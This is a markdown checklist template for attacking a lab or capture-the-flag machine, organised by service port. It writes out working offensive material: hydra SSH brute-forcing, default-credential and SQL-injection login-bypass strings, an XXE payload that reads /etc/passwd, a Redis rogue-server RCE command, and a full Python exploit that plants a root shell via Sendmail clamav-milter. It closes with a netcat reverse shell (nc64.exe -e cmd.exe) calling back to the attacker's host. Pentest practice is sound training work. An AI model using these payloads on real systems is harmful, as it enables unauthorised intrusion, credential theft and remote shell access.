# {VM_NAME}

| Variable          | Value        |
| ----------------- | ------------ |
| Remote IP         | {REMOTE_IP}  |
| Local IP          | {LOCAL_IP}   |
| Local listen port | {LOCAL_PORT} |

## Nmap

- [ ] Full TCP port scan

```bash
ports=$(nmap -p- --min-rate=1000 -T4 {REMOTE_IP} | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

```bash
nmap -p$ports -sV -A {REMOTE_IP}
```

- [ ] Well-known UDP port scan

```bash
sudo nmap -Pn -sU --min-rate=10000 {REMOTE_IP}
```

## TCP
### FTP - 21

- [ ] Anonymous login

```bash
ftp anonymous@{REMOTE_IP} 21
```

### SSH - 22

- [ ] Brute-force attack

```bash
hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_pass_words.txt ssh://{REMOTE_IP} -V -f -t 60
```

- [ ] Check joe account login

```bash
ssh username@{REMOTE_IP}
```

If `no matching host key type found` error occurs with this command, try the following.

```bash
ssh -oHostKeyAlgorithms=+ssh-dss username@{REMOTE_IP}
```

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa username@{REMOTE_IP}
```

### HTTP - 80

- [ ] Check software version

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
|               |         |               |
|               |         |               |
|               |         |               |

- [ ] Directory buster

```bash
gobuster dir -u http://{REMOTE_IP}:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

If the web server we are attacking is configured to always respond with a 200 response code, try the following.

```bash
gobuster dir -u http://{REMOTE_IP}:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s "204,301,302,307,401,403"
```

| wordlist path                                               | description                        | lines  |
| ----------------------------------------------------------- | ---------------------------------- | ------ |
| /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | priority order case sensitive list | 87,664 |
| /usr/share/wordlists/dirb/common.txt                        | default wordlist for dirb          | 4,614  |

```bash
gobuster results
```

- [ ] 200 status directory
  - [ ] /
  - [ ] /
  - [ ] /
- [ ] Default credentials
  - [ ] admin:admin
  - [ ] admin:password
  - [ ] administrator:administrator
  - [ ] administrator:password
  - [ ] root:root
  - [ ] root:password
- [ ] [Most common passwords](https://cybernews.com/best-password-managers/most-common-passwords/)
  - [ ] 123456
  - [ ] 123456789
  - [ ] qwerty
- [ ] [SQL Injection](https://github.com/mrsuman2002/SQL-Injection-Authentication-Bypass-Cheat-Sheet/blob/master/SQL%20Injection%20Cheat%20Sheet.txt)
  - [ ] admin' or '1'='1
  - [ ] admin" or "1"="1
  - [ ] admin") or ("1"="1

- [ ] PHP strcmp() function

We can send an empty array instead of a string as the value of the password (https://example.com/login.php/?username=admin&password[]=) and bypass authentication check.

```BurpSuite
POST /admin/index.php?login=1 HTTP/1.1
<snip>
username=admin&password[]=
```

- [ ] [XML External Entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

```BurpSuite
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

- [ ] Check `.htpasswd` credentials

```bash
$ pwd
/var/www/html
$ ls -a
.htaccess	.htpasswd
$ cat .htpasswd
username:password
```

### SMB - 445

- [ ] Administrator login

```bash
smbclient -L {REMOTE_IP} -U Administrator
```

### RDP - 3389

- [ ] Guest login

```bash
xfreerdp /v:{REMOTE_IP}
```

- [ ] Administrator login

```bash
xfreerdp /v:{REMOTE_IP} /cert:ignore /u:Administrator
```

### Redis - 6379

- [ ] [Redis Rogue Server <= 5.0.5 - RCE](https://github.com/n0b0dyCN/redis-rogue-server)

```bash
python3 redis-rogue-server.py --rhost {REMOTE_IP} --rport 6379 --lhost {LOCAL_IP} --lport {LOCAL_PORT}
```

## UDP
### TFTP - 69

- [ ] Upload any file

```bash
tftp {REMOTE_IP}
```

```tftp
tftp> put {any_filename}
tftp> quit
```

The default save location for uploaded files is `/var/lib/tftpboot/`.

### SNMP - 161

- [ ] Enumerate SNMP managed devices

```bash
snmp-check {REMOTE_IP}
```

- [ ] [Sendmail with clamav-milter < 0.91.2 - RCE](https://www.exploit-db.com/exploits/4761)

```python
#!/usr/bin/python3
import os
import sys
import socket

if len(sys.argv[1:]) != 1:
    print("Usage: ./clamav_milter_shell.py [targethost]")
    print("Example: ./clamav_milter_shell.py 10.12.132.1")
    sys.exit(0)

target_host = sys.argv[1]
target_port = 25
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host, target_port))
client.send(b"ehlo you\r\n"
            b"mail from: <>\r\n"
            b"rcpt to: <nobody+\"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\"@localhost>\r\n"
            b"rcpt to: <nobody+\"|/etc/init.d/inetd restart\"@localhost>\r\n"
            b"data\r\n.\r\nquit\r\n")
os.system(f"nc -nv {REMOTE_IP} 31337")
client.close()
```

## Linux Privilege Escalation

- [ ] List SUDO binaries

```bash
sudo -l
```

- [ ] Find SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

If the owner of the binary is `root`, check [GTFOBins](https://gtfobins.github.io/).

## Windows Privilege Escalation

- [ ] [nc64.exe](https://eternallybored.org/misc/netcat/)

Remote machine

```bash
nc64.exe -e cmd.exe {LOCAL_IP} {LOCAL_PORT}
```

